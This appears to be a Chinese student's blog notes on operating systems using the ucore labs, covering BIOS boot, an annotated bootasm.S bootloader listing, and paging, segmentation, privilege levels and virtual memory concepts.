title="BIOS"></a>BIOS</h2><p>BIOS从磁盘读引导扇区（512字节）里的加载程序，将其写到内存0x7c00，然后CS:IP跳到那里去执行加载程序（bootloader）。<br>详细一点说，BIOS只能在实模式下运行，它先是检查硬件，进行设备初始化。修电脑时，显示器不工作，可以猜测内存有问题。因为BIOS先检查到内存有问题，后面它就不用检查了，也不启动系统了。然后检查插入的U盘、磁盘什么的。检查产生的信息成为BIOS数据。虽然ROM数据不会消失，但是因为每次插入的硬件不一样，所以BIOS会改这些数据。最后读我们磁盘的第一个扇区。BIOS先读磁盘的主引导扇区（512字节）。因为这个东西提供的信息可以帮我们选择启动磁盘里的哪个操作系统。根据主引导扇区的信息来选择并读取活动分区（分区引导扇区）。先执行分区引导扇区的跳转指令，跳转到启动代码启动到加载程序。</p><h2 id="加载程序"><a href="#加载程序" class="headerlink" title="加载程序"></a>加载程序</h2><p>加载程序把磁盘的ucore操作系统数据和代码加载到内存，再跳到ucore起始地址。把控制权交给操作系统。<br>详细地说，加载程序会先从文件系统中读取启动配置信息，依据这些信息决定怎么加载内核，这个地方如果我们可以弄一个选项在显示屏（启动菜单），可以改参数就很好。最后跳到内核。</p><p><img src="https://img-blog.csdnimg.cn/4feec1f1ab2f4d50bf94d10bb25a6110.png">ucore结构简单，应该是直接到加载程序。</p><h2 id="不够详细"><a href="#不够详细" class="headerlink" title="不够详细"></a>不够详细</h2><p>知道这些还是很粗糙，如果写实际程序，还要根据CPU手册、BIOS规范（从哪里读第一条，上文是0xFFFF0）。所以自己写操作系统还是要查很多资料的。</p><h2 id="系统启动规范"><a href="#系统启动规范" class="headerlink" title="系统启动规范"></a>系统启动规范</h2><h3 id="BIOS-1"><a href="#BIOS-1" class="headerlink" title="BIOS"></a>BIOS</h3><p>这里的主引导扇区的硬盘分区表只有四个分区信息，每个分区信息16字节（BIOS-MBR）。BIOS-GPT则支持超过四个分区。PXE是网络启动，从服务器下载资料到磁盘来启动，此时BIOS要有网络下载功能，BIOS变复杂了。前面说的是在本地磁盘启动。</p><h3 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h3><p>在所有平台一致地启动操作系统。启动磁盘的任何系统。为了安全，检查引导记录是否可信。只读取满足签名的引导记录。</p><h3 id="查资料"><a href="#查资料" class="headerlink" title="查资料"></a>查资料</h3><p><a href="https://zhuanlan.zhihu.com/p/81960137">知乎BIOS与UEFI区别</a></p><h2 id="加载程序干什么"><a href="#加载程序干什么" class="headerlink" title="加载程序干什么"></a>加载程序干什么</h2><p>加载程序（bootloader）先定义全局描述符表，然后让CPU从实模式进入保护模式，最后加载内核文件。</p><h2 id="定义全局描述符表"><a href="#定义全局描述符表" class="headerlink" title="定义全局描述符表"></a>定义全局描述符表</h2><blockquote><p>我们知道，为了让程序在内存中能自由浮动而又不影响它的正常执行，处理器将内存划分成逻辑上的段，并在指令中使用段内偏移地址。在保护模式下，对内存的访问仍然使用段地址和偏移地址，但是，在每个段能够访问之前，必须先进行登记。<br>《X86汇编语言-从实模式到保护模式》</p></blockquote><p>每个段由8字节的段描述符描述，描述表存放描述符。<br>最主要的描述表是全局描述表（Global Descriptor Table，GDT）。还有一个是局部描述表。<br>CPU有一个48位全局描述表寄存器（GDTR）。它分为32位的线性地址和16位的边界。GDTR 的线性地址部分保存的是全局描述符表在内存中的起始线性地址。边界保存的是全局描述表的边界，其在数值上等于表的大小（总字节数）减一。</p><p><img src="https://img-blog.csdnimg.cn/87864d9b7b3b44d99199ee9c44c55dcb.png"></p><p>GDT最大大小是16位（216字节），由于在实模式下只能访问1MB 的内存，所以GDT 通常都定义在1MB 以下的内存范围中。</p><h2 id="加载程序源代码分析"><a href="#加载程序源代码分析" class="headerlink" title="加载程序源代码分析"></a>加载程序源代码分析</h2><h3 id="bootasm-S"><a href="#bootasm-S" class="headerlink" title="bootasm.S"></a>bootasm.S</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm.h&gt;</span></span><br><br>.<span class="hljs-built_in">set</span> PROT_MODE_CSEG,        <span class="hljs-number">0x8</span>                     # 代码段<br>.<span class="hljs-built_in">set</span> PROT_MODE_DSEG,        <span class="hljs-number">0x10</span>                    # 数据段<br>.<span class="hljs-built_in">set</span> CR0_PE_ON,             <span class="hljs-number">0x1</span>                     # 保护模式标志<br><br># BIOS根据引导扇区加载bootloader到内存 然后从<span class="hljs-number">0x7c00</span>开始执行<br>.globl start                                        # .globl表示整个程序入口<br>start:<br>.code16                                             # 以<span class="hljs-number">16</span>位（实模式）执行<br>    cli                                             # 禁止中断发生<br>    cld                                             # 使方向标志位为<span class="hljs-number">0</span> 程序往地址增加方向执行<br><br>    xorw %ax, %ax                                   <span class="hljs-meta"># ax清零</span><br>    movw %ax, %ds                                   <span class="hljs-meta"># ds清零</span><br>    movw %ax, %es                                   <span class="hljs-meta"># es清零</span><br>    movw %ax, %ss                                   <span class="hljs-meta"># ss清零</span><br><br>    # 看官方文档 https:<span class="hljs-comment">//chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_appendix_a20.html</span><br>    # 再看 《X86汇编语言 从实模式到保护模式》 <span class="hljs-number">11.5</span> 关于第<span class="hljs-number">21</span>条地址线A20的问题<br>    # 为了进入<span class="hljs-number">32</span>位保护模式 必须先开启A20 大概知道一下 我感觉源代码也没有完全按文档来<br><br>seta20<span class="hljs-number">.1</span>:<br>    inb $<span class="hljs-number">0x64</span>, %al                                  # 读<span class="hljs-number">64</span>h端口获得StatusRegister<br>    testb $<span class="hljs-number">0x2</span>, %al                                 # 如果StatusRegister从低到高第<span class="hljs-number">2</span>位为<span class="hljs-number">0</span> <br>                                                    # 说明无输入 可以进入保护模式<br>    jnz seta20<span class="hljs-number">.1</span>                                    # 如果al低<span class="hljs-number">2</span>位为<span class="hljs-number">0</span> 则ZF=<span class="hljs-number">0</span> 则不跳转 说明低<span class="hljs-number">2</span>位为<span class="hljs-number">0</span><br><br>    movb $<span class="hljs-number">0xd1</span>, %al                                 # 向<span class="hljs-number">64</span>h发送<span class="hljs-number">0</span>d1h命令<br>    outb %al, $<span class="hljs-number">0x64</span><br><br>seta20<span class="hljs-number">.2</span>:<br>    inb $<span class="hljs-number">0x64</span>, %al<br>    testb $<span class="hljs-number">0x2</span>, %al<br>    jnz seta20<span class="hljs-number">.2</span><br><br>    movb $<span class="hljs-number">0xdf</span>, %al<br>    outb %al, $<span class="hljs-number">0x60</span><br><br>    # 设置GDT<br>    lgdt gdtdesc<br>    <br>    # 修改CRO寄存器中的保护模式允许位 进入保护模式<br>    movl %cr0, %eax<br>    orl $CR0_PE_ON, %eax                            # 与<span class="hljs-number">0x1</span>进行或运算<br>    movl %eax, %cr0                                 # cr0设置为<span class="hljs-number">1</span><br><br>    ljmp $PROT_MODE_CSEG, $protcseg                 # 以PROT_MODE_CSEG为段地址，protcseg为段内偏移地址<br><br>.code32                                             # 以<span class="hljs-number">32</span>位（保护模式）执行<br>protcseg:<br>    # 设置数据段<br>    movw $PROT_MODE_DSEG, %ax<br>    movw %ax, %ds<br>    movw %ax, %es<br>    movw %ax, %fs<br>    movw %ax, %gs<br>    movw %ax, %ss<br><br>    # Set up the <span class="hljs-built_in">stack</span> pointer and call into C. The <span class="hljs-built_in">stack</span> region is from <span class="hljs-number">0</span>--start(<span class="hljs-number">0x7c00</span>)<br>    movl $<span class="hljs-number">0x0</span>, %ebp<br>    movl $start, %esp<br>    call bootmain                                   # 调用bootmain<br><br>    # 如果bootmain返回了 继续循环<br>spin:<br>    jmp spin<br><br># Bootstrap GDT<br>.p2align <span class="hljs-number">2</span>                                          # <span class="hljs-number">4</span>比特对齐 不知道啥意思<br>    # <span class="hljs-number">32</span>位的处理器具有<span class="hljs-number">32</span>根地址线 可以访问的地址范围是<span class="hljs-number">0x00000000</span>到<span class="hljs-number">0xffffffff</span><br>    # 所以 base为<span class="hljs-number">0x0</span> lim为<span class="hljs-number">0xffffffff</span><br>gdt:<br>    SEG_NULLASM                                     # 空段 <span class="hljs-number">8</span>字节<br>    SEG_ASM(STA_X|STA_R, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xffffffff</span>)           # 代码段 <span class="hljs-number">8</span>字节 type为可读可执行段<br>    SEG_ASM(STA_W, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xffffffff</span>)                 # 数据段 <span class="hljs-number">8</span>字节 type为只写段<br><br># GDT创建<br>gdtdesc:<br>    .word <span class="hljs-number">0x17</span>                                      # 边界（表的总字节数减一）<br>                                                    # <span class="hljs-number">3</span>*<span class="hljs-number">8</span><span class="hljs-number">-1</span>=<span class="hljs-number">23</span>=<span class="hljs-number">0x17</span>字节 用一个字的空间储存<br>    .<span class="hljs-type">long</span> gdt                                       # 线性基地址（GDT首地址）<br><br></code></pre></td></tr></table></figure><p>asm.h里面是实现如何创建GDT，不清楚原理</p><h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><h3 id="练习2：使用qemu执行并调试lab1中的软件"><a href="#练习2：使用qemu执行并调试lab1中的软件" class="headerlink" title="练习2：使用qemu执行并调试lab1中的软件"></a>练习2：使用qemu执行并调试lab1中的软件</h3><p>下载上面的lab答案，进入lab1_result目录，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make lab1-mon<br></code></pre></td></tr></table></figure><p>会出现下面三个窗口<br><img src="https://img-blog.csdnimg.cn/ed541f0d11144b61ba911180641dac72.png"><br>项目自动帮我们在0x7c00打了断点<br>我的gdb加了pwndbg插件，可以看见这个0x7c00和后面的指令<br><img src="https://img-blog.csdnimg.cn/81cebcfdbfe84b80b0cf8295a37b9927.png"><br>一直输入命令<code>n</code>进行调试<br><img src="https://img-blog.csdnimg.cn/b91d81cdbc9641a9a728f770fe6c1981.png"><br>当执行完<code>call kern_init</code>时qemu屏幕有新的输出<br><img src="https://img-blog.csdnimg.cn/471f1303cc5b46fbbd3c9391a6e951a5.png"><br>这个过程是先执行bootasm.S<br>bootasm.S会调用bootmain.c中的bootmain()<br>bootmain()会调用kern&#x2F;init&#x2F;init.c中的kern_init()<br>大佬的答案中对源码有注释</p><h3 id="练习5：实现函数调用堆栈跟踪函数-（需要编程）"><a href="#练习5：实现函数调用堆栈跟踪函数-（需要编程）" class="headerlink" title="练习5：实现函数调用堆栈跟踪函数 （需要编程）"></a>练习5：实现函数调用堆栈跟踪函数 （需要编程）</h3><p>我们要实现kern&#x2F;debug&#x2F;kdebug.c里面的print_stackframe()<br>堆栈跟踪函数就是把寄存器信息打印一下</p><blockquote><p>由于显示完整的栈结构需要解析内核文件中的调试符号，较为复杂和繁琐。代码中有一些辅助函数可以使用。例如可以通过调用print_debuginfo函数完成查找对应函数名并打印至屏幕的功能。具体可以参见kdebug.c代码中的注释<br>《ucore_os_docs》</p></blockquote><p>那就很方便了</p><h2 id="地址空间-amp-地址生成"><a href="#地址空间-amp-地址生成" class="headerlink" title="地址空间&amp;地址生成"></a>地址空间&amp;地址生成</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>物理地址就是总线看见的地址，逻辑地址是进程看到的地址</p><h3 id="逻辑地址生成"><a href="#逻辑地址生成" class="headerlink" title="逻辑地址生成"></a>逻辑地址生成</h3><p>程序源代码经过编译和汇编后得到预备的地址，再链接添加函数库地址，当加载到内存时会重定向地址。相当于加载之前是确定内部各个指令的相对位置，加载后再确认绝对位置。<br>上面是加载时生成，还有编译时生成、执行时生成</p><h3 id="逻辑地址处理"><a href="#逻辑地址处理" class="headerlink" title="逻辑地址处理"></a>逻辑地址处理</h3><p>CPU如果见到一个指令的地址，CPU里面的MMU就把它翻译成物理地址，CPU就找这个地址并结合处理信号来处理。如果逻辑地址访问非法，产生异常。</p><h2 id="连续内存分配"><a href="#连续内存分配" class="headerlink" title="连续内存分配"></a>连续内存分配</h2><p>为了方便，内存分配大小设计为2的整数次幂</p><h3 id="内存碎片"><a href="#内存碎片" class="headerlink" title="内存碎片"></a>内存碎片</h3><p>不能利用的内存空间（太小了）</p><h3 id="外部碎片和内部碎片"><a href="#外部碎片和内部碎片" class="headerlink" title="外部碎片和内部碎片"></a>外部碎片和内部碎片</h3><p><img src="https://img-blog.csdnimg.cn/0adc5bba102a4ca8885d603a430cee31.png"></p><h3 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h3><p>根据内存占用情况进行分配。方法有最先匹配、最佳匹配、最差匹配<br>空闲分区列表储存空闲分区<br>释放分区时合并临近地址的空闲内存分区，调整空闲分区列表</p><h3 id="最先匹配"><a href="#最先匹配" class="headerlink" title="最先匹配"></a>最先匹配</h3><p>思路：需要分配内存时按从低到高顺序寻找第一个可以满足的空闲内存空间，空闲分区列表按地址顺序排序<br>优点：简单、在高地址空间有大块的空闲分区<br>缺点：外碎片多，导致寻找大块时要遍历更多次，寻找大块时较慢</p><h3 id="最佳匹配"><a href="#最佳匹配" class="headerlink" title="最佳匹配"></a>最佳匹配</h3><p>思路：寻找满足需求中最小的内存分区，空闲分区列表按大小顺序排序（可以由小到大，都行）<br>优点：大部分分配的尺寸较小时效果好、避免大的空闲分区被拆分、可减小外部碎片大小、相对简单<br>缺点：内外部碎片更小，更加不能利用</p><h3 id="最差匹配"><a href="#最差匹配" class="headerlink" title="最差匹配"></a>最差匹配</h3><p>思路：寻找满足需求中最大的内存分区，空闲分区列表按大小顺序排序（可以由大到小，都行）<br>优点：中等大小的分配较多时，效果最好，小碎片少<br>缺点：后续大内存分配难</p><h2 id="碎片整理"><a href="#碎片整理" class="headerlink" title="碎片整理"></a>碎片整理</h2><p>下面是碎片整理的一些方法</p><h3 id="紧凑"><a href="#紧凑" class="headerlink" title="紧凑"></a>紧凑</h3><p>把进程占用内存压到一起，不过需要指令内容的地址要变，也就是应用程序可以动态重定向。这个操作要在进程处于等待时进行。</p><h3 id="分区对换"><a href="#分区对换" class="headerlink" title="分区对换"></a>分区对换</h3><p>进程处于等待时把它的数据放到外存</p><h2 id="伙伴（伴侣）系统"><a href="#伙伴（伴侣）系统" class="headerlink" title="伙伴（伴侣）系统"></a>伙伴（伴侣）系统</h2><p>假设可分配分区大小为2的u次幂，需要分配内存空间为m。如果两倍m大于2的u次幂且m小于等于2的u次幂就分配，否则把2的u次幂分一半，继续跟m比。<br>合并时注意大小是2的整数次幂。</p><h3 id="合并条件"><a href="#合并条件" class="headerlink" title="合并条件"></a>合并条件</h3><p>大小相同（2的i次幂）、地址相邻、起始地址较小的块的起始地址必须是2的i+1次幂的倍数</p><p><img src="https://img-blog.csdnimg.cn/165a51e908e34e79b688c84491497d7d.png">如上图，B应该和C合并，不能和A合并。A起始地址可以把前面内存空间大小加起来得到，是256K（2的8次幂）。要求合并空间的起始地址必须是2的9次幂，所以不行。而B起始地址是2的9次幂，所以B和C合并。看上面的树状图，形象地说就是，合并地址要有相同根节点。其实这里可以用二叉树数据结构。</p><h2 id="非连续内存分配"><a href="#非连续内存分配" class="headerlink" title="非连续内存分配"></a>非连续内存分配</h2><p>如果最大的连续内存都不够，可以继续非连续内存分配。段式分配的单位内存大，页式小。可以把段式和页式结合起来成为段页式。</p><h3 id="非连续内存分配设计目标"><a href="#非连续内存分配设计目标" class="headerlink" title="非连续内存分配设计目标"></a>非连续内存分配设计目标</h3><p>提高内存利用效率和管理灵活性<br>允许一个程序的使用非连续的物理地址空间<br>允许共享代码与数据<br>支持动态加载和动态链接</p><h2 id="段式储存管理"><a href="#段式储存管理" class="headerlink" title="段式储存管理"></a>段式储存管理</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p><strong>段表示访问方式和存储数据等属性相同的一段地址空间</strong><br>进程的段空间由多个段组成：主代码段、子模块代码、公用库代码段、堆栈段（stack）、堆数据（heap）、初始化数据段、符号表等</p><h3 id="段访问及实现"><a href="#段访问及实现" class="headerlink" title="段访问及实现"></a>段访问及实现</h3><p>段号（s）加段内偏移（addr）<br>CPU访问一个逻辑地址（逻辑地址由段号和偏移组成）时，用段号查进程的段表中的段描述符（基本内容是基址、长度）。段表由操作系统控制。MMU把长度和偏移做比较，检查越界。如果越界，产生异常。<br><img src="https://img-blog.csdnimg.cn/dd5928db1180447aaf7c91847ca0c5a6.png"></p><h2 id="页式储存管理"><a href="#页式储存管理" class="headerlink" title="页式储存管理"></a>页式储存管理</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>物理地址空间基本单位叫<strong>页帧</strong>（Frame），大小为2的n次方。虚拟地址空间基本单位叫<strong>页面</strong>（Page）</p><h3 id="页帧"><a href="#页帧" class="headerlink" title="页帧"></a>页帧</h3><p>物理地址表示：帧号（f）和偏移量（o）<br>物理地址&#x3D;f$*2^S$+o<br><img src="https://img-blog.csdnimg.cn/25a3a03edb5549ae87dc0f578b59ad07.png"></p><p>如上图，F&#x3D;7，S&#x3D;9，f&#x3D;3，o&#x3D;3</p><h3 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h3><p>逻辑空间地址被划分为大小相等的页<br>页内偏移等于帧内偏移<br>通常页号大小不等于帧号，因为页号经过转换后不一定对应相等的帧号<br>虚拟地址表示：页号（p）和偏移量（o）<br>虚拟地址&#x3D;p$*2^S$+o</p><h3 id="通过页找到帧"><a href="#通过页找到帧" class="headerlink" title="通过页找到帧"></a>通过页找到帧</h3><p>CPU得到逻辑地址，用p到页表找对应的f，两者偏移一样。直接得到帧偏移量<br><img src="https://img-blog.csdnimg.cn/60719c9e7e554e68b0e84b5b4747b216.png"></p><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>每个进程都有一个页表，每个页面对应一个页表项。页表随进程运行状态动态变化。页表基址寄存器（PTBR）可以告诉我们页表基址。PTBR的值是通过CR3寄存器获取的。</p><h3 id="页表项组成"><a href="#页表项组成" class="headerlink" title="页表项组成"></a>页表项组成</h3><p>页表由帧号、页表项标志组成<br>页表项标志：存在位、修改位、引用位<br>存在位：一个逻辑页号是否存在一个物理帧与它相对应，如果有则为1<br>修改位：页面内容是否修改<br>引用位：页面是否有过被引用、被访问</p><h3 id="页式储存管理优化"><a href="#页式储存管理优化" class="headerlink" title="页式储存管理优化"></a>页式储存管理优化</h3><p>缓存：把一次获取的页表项的后面几项缓存起来，可能下次用<br>间接访问：多级页表，把一个页表分多个，方便找</p><h3 id="快表（TLB）和多级页表"><a href="#快表（TLB）和多级页表" class="headerlink" title="快表（TLB）和多级页表"></a>快表（TLB）和多级页表</h3><p>快表（TLB）：把近期访问过的页表<strong>项</strong>缓存到CPU里面<br>TLB由关联储存器实现，因为在CPU里面，所以快<br>多级页表：见下图，第一级页表基址在PTBR里储存<br><img src="https://img-blog.csdnimg.cn/353cbea99fd544af9514e45d00373a6e.png"></p><h3 id="反置页表"><a href="#反置页表" class="headerlink" title="反置页表"></a>反置页表</h3><p>如果页表级数过多，访问页表次数增加，很繁琐，所以有了反置页表。<br>反置页表是页表与物理地址相对应，所有进程共同使用一张页表</p><h3 id="页寄存器"><a href="#页寄存器" class="headerlink" title="页寄存器"></a>页寄存器</h3><p>每个帧与一个页寄存器关联，寄存器内容包括：使用位、占用页号（逻辑页号p）、保护位（访问方式，比如：可读，可写）<br>优点：页表大小相对于物理内存很小、页表大小与逻辑地址空间大小无关<br>缺点：页表信息对调后，需要依据帧号可找页号、在页寄存器中搜索逻辑地址中的页号困难</p><h3 id="页寄存器中的地址转换"><a href="#页寄存器中的地址转换" class="headerlink" title="页寄存器中的地址转换"></a>页寄存器中的地址转换</h3><p>对逻辑地址的p和进程ID（PID）的数字之和进行哈希算法，用哈希表映射，减少搜索访问，解决哈希冲突。检查页号和页表的PID跟请求的页号和页表的PID是否一样，其他步骤跟前面一样</p><h3 id="反置页表的哈希冲突"><a href="#反置页表的哈希冲突" class="headerlink" title="反置页表的哈希冲突"></a>反置页表的哈希冲突</h3><p>用得到的哈希值H（即页表第H条）在页表查时发现对应的PID和页号跟哈希前不一样，没关系，页表还提供下一个PID和页号之和哈希值为H的地址</p><p><img src="https://img-blog.csdnimg.cn/92196813b57f468dbd58e006d2b6fe78.png"></p><h3 id="段式存储管理基础"><a href="#段式存储管理基础" class="headerlink" title="段式存储管理基础"></a>段式存储管理基础</h3><p>逻辑地址由s（段号）、p（页号）、o（偏移）组成<br>物理地址由f（帧号）、o（偏移）<br>先根据s找段表的对应段表项，再根据p找页表中对应的页表项，最后根据o得到具体物理地址。<br>通过指向相同的页表基址，可以实现<strong>进程间的段共享</strong></p><h2 id="实验二-物理内存管理"><a href="#实验二-物理内存管理" class="headerlink" title="实验二 物理内存管理"></a>实验二 物理内存管理</h2><h3 id="了解x86保护模式中的特权级"><a href="#了解x86保护模式中的特权级" class="headerlink" title="了解x86保护模式中的特权级"></a>了解x86保护模式中的特权级</h3><p>特权级范围是从0到3级<br>ucore和Linux都只有ring0级（内核级）和ring3级（用户级）</p><h3 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h3><p>段选择子位于段寄存器里面<br><img src="https://img-blog.csdnimg.cn/bf8a38b4b6a1407d94a75d9308db6aa7.png"></p><p>上图的RPL（描述特权级大小）与数据段相关，后面讲的的CPL与代码段相关，与段描述符的DPL（描述段特权级是ring0还是其他什么）比较，RPL象征的权限大于大于DPL才能执行、访问或者中断。中断门（Interrupt Gate）、陷入门（Trap Gate）也有DPL。<br>段寄存器DS,ES,FS,GS里面有RPL<br>段寄存器CS,SS里面有CPL<br>访问门时：CPL&lt;&#x3D;门的DPL（也就是门特权级低）&amp;CPL&gt;&#x3D;段的DPL<br>为什么CPL&gt;&#x3D;段的DPL？这就体现了ring3应用程序访问ring0级服务的情况<br>访问段时：MAX（CPL,RPL）&lt;&#x3D;段的DPL</p><h3 id="了解特权级切换过程"><a href="#了解特权级切换过程" class="headerlink" title="了解特权级切换过程"></a>了解特权级切换过程</h3><p>通过中断切换特权级<br>产生中断时，把当前状态保存在属于ring0的栈里面</p><h3 id="ring0到ring3的切换"><a href="#ring0到ring3的切换" class="headerlink" title="ring0到ring3的切换"></a>ring0到ring3的切换</h3><p>把属于ring0的栈里面的CS的CPL改为3（ring3），SS的RPL改为3，EIP看情况改</p><h3 id="ring3到ring0的切换"><a href="#ring3到ring0的切换" class="headerlink" title="ring3到ring0的切换"></a>ring3到ring0的切换</h3><p>把属于ring0的栈里面的CS的CPL改为0（ring0），CS指向地址也改，SS和ESP清除，不要ring3的栈了，EIP改</p><h3 id="任务状态段（Task-State-Segment）"><a href="#任务状态段（Task-State-Segment）" class="headerlink" title="任务状态段（Task-State Segment）"></a>任务状态段（Task-State Segment）</h3><p>它保存了寄存器的特权信息，ring3到ring0的切换需要的新栈（SS、ESP在栈里面的信息已经清除）相关的寄存器设置就是根据TSS来的<br>TSS描述符（保存TSS地址等信息）也放在全局描述表里面<br>对于ucore，就利用TSS里面的SS、ESP信息<br>Task Register寄存器会缓存TSS地址信息，方便查找</p><h3 id="了解段页表"><a href="#了解段页表" class="headerlink" title="了解段页表"></a>了解段页表</h3><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>段寄存器一部分内容是index，作为一个索引来找到全局描述符表中的一个项（段描述符）<br>如果没有开启页基址，CS:IP等就是物理地址，但还是要通过段描述符来映射</p><h3 id="段选择子中的隐藏部"><a href="#段选择子中的隐藏部" class="headerlink" title="段选择子中的隐藏部"></a>段选择子中的隐藏部</h3><p>GDT因为占空间大所以放在内存里面，硬件会把GDT的段描述符的关键信息放在段寄存器的隐藏部分（用来缓存）</p><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><p>虚拟地址比线性地址（逻辑地址到物理地址变换之间的中间层）大0xC0000000（7个0）<br>选择页机制为主</p><h3 id="了解UCORE建立段-x2F-页表"><a href="#了解UCORE建立段-x2F-页表" class="headerlink" title="了解UCORE建立段&#x2F;页表"></a>了解UCORE建立段&#x2F;页表</h3><p>线性地址由32位组成，0到11位是offset，12到21是table，22到31是directory（页目录）。根据directory从page directory（页目录表）找到对应的项PDE，比如directory就表示查表的第directory项，后面也是一样。PDE记录的是二级页表里面的起始地址。根据table从page table找到对应的项PTE（page table entry），PTE存的是线性地址对应的页的起始地址。PTE左移三位加上offset作为最终物理地址。<br>CR3寄存器保存页目录表的起始地址。</p><h3 id="页表或者页目录表包含哪些信息"><a href="#页表或者页目录表包含哪些信息" class="headerlink" title="页表或者页目录表包含哪些信息"></a>页表或者页目录表包含哪些信息</h3><p>除了关注页表或者页目录表中的基址信息，还有关注它们的属性。<br>比如是否可读，是否ring3级别能访问等。</p><h3 id="使能页机制"><a href="#使能页机制" class="headerlink" title="使能页机制"></a>使能页机制</h3><p>CR0第0位（PE）如果置1，则enable保护模式，第31位（PG）如果置1，就代表使能了页机制</p><h2 id="虚拟存储概念"><a href="#虚拟存储概念" class="headerlink" title="虚拟存储概念"></a>虚拟存储概念</h2><h3 id="存储器速度排行"><a href="#存储器速度排行" class="headerlink" title="存储器速度排行"></a>存储器速度排行</h3><p><img src="https://img-blog.csdnimg.cn/42188b70e59e43aba11cee793858692f.png"></p><h3 id="虚拟储存需求"><a href="#虚拟储存需求" class="headerlink" title="虚拟储存需求"></a>虚拟储存需求</h3><p>内存空间不够时，有两种方法<br>覆盖：应用程序<strong>手动</strong>把需要的指令和数据分时间段在内存中保存和清除<br>交换：操作系统<strong>自动</strong>把暂时不能执行的程序保存到外存中<br>虚拟储存：在有限容量的内存中，以页为单位<strong>自动</strong>装入更多更大的程序</p><h3 id="覆盖技术"><a href="#覆盖技术" class="headerlink" title="覆盖技术"></a>覆盖技术</h3><p>把程序分为必要部分和不必要部分，必要部分在内存中常驻，不必要部分共用同一段内存，相互覆盖<br><img src="https://img-blog.csdnimg.cn/db0de8a27d0140a4a884eb5f9acfef8e.png"><br>A为必要部分，其他为不必要部分<br>缺点：需要划分功能模块，并确定模块间的覆盖关系，增加编程复杂度，时间换空间</p><h3 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h3><p>以进程为单位，将暂时不能运行的程序放到外存，程序在换入时要重定位<br>交换时机：只有当内存空间不够或者可能不够时换出</p><h3 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h3><p>时间局部性：一条指令两次执行或者一个数据的两次访问都集中在一个较短时期内<br>空间局部性：邻近的指令和数据集中在一个较小区域内<br>分支局部性：一条跳转指令的两次执行，很可能跳到相同的内存位置，比如循环，重复跳到循环第一句</p><h3 id="虚拟存储的基本概念"><a href="#虚拟存储的基本概念" class="headerlink" title="虚拟存储的基本概念"></a>虚拟存储的基本概念</h3><p>思路：将不常用的部分内存块暂存到外存<br>原理：装载程序时，只将当前指令执行需要的部分页面或段装在内存内。如果指令执行中需要的指令或数据不在内存（缺页或者缺段），处理器通知操作系统将对应的页面或段调入内存。操作系统将内存中暂时不用的页面或段保存到外存。<br>实现方式：虚拟页式存储、虚拟段式存储<br>特征：不连续性，物理内存分配非连续，虚拟地址空间使用非连续。大用户空间，提供给用户的虚拟内存可大于实际的物理内存。部分交换，虚拟存储只对部分虚拟地址空间进行交换</p><h3 id="虚拟页式存储地址转换"><a href="#虚拟页式存储地址转换" class="headerlink" title="虚拟页式存储地址转换"></a>虚拟页式存储地址转换</h3><p><strong>地址转换</strong>和页式存储的地址转换一样</p><h3 id="页表项结构"><a href="#页表项结构" class="headerlink" title="页表项结构"></a>页表项结构</h3><p>下面是一级页表，参考一下，其他页表内容差不多<br><img 